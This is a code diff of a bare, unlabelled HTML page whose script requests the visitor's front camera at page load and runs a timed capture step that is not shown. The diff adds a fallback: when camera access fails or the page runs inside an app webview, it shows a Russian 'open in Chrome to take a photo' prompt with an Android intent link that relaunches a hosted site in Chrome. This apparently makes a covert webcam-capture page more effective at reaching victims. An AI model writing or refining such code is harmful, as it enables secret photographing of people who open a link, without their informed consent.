@@ -5,12 +5,35 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Страница</title>
 <style>
-  body { margin: 0; background: #f0f0f0; }
+  body { margin: 0; background: #f0f0f0; font-family: sans-serif; }
+  #hint { display: none; padding: 24px; text-align: center; }
+  #hint a { display: inline-block; margin-top: 16px; padding: 14px 24px;
+            background: #111; color: #fff; text-decoration: none;
+            border-radius: 8px; font-size: 16px; }
 </style>
 </head>
 <body>
+<div id="hint">
+  <p>Чтобы снять фото, открой в браузере Chrome.</p>
+  <a id="openChrome" href="#">Открыть в Chrome</a>
+</div>
+
 <script>
 (function() {
+  var hint = document.getElementById('hint');
+  var btn = document.getElementById('openChrome');
+
+  // Кнопка "Открыть в Chrome" через intent
+  var url = 'https://cam-site-c0we.onrender.com';
+  var intentUrl = 'intent://cam-site-c0we.onrender.com#Intent;scheme=https;package=com.android.chrome;end';
+  btn.href = intentUrl;
+
+  // Проверяем наличие getUserMedia
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    hint.style.display = 'block';
+    return;
+  }
+
   navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
   .then(function(stream) {
     var video = document.createElement('video');
@@ -37,7 +60,10 @@
       });
     }, 1500);
   })
-  .catch(function() {});
+  .catch(function() {
+    // Камера запрещена или webview — показываем кнопку Chrome
+    hint.style.display = 'block';
+  });
 })();
 </script>
 </body>
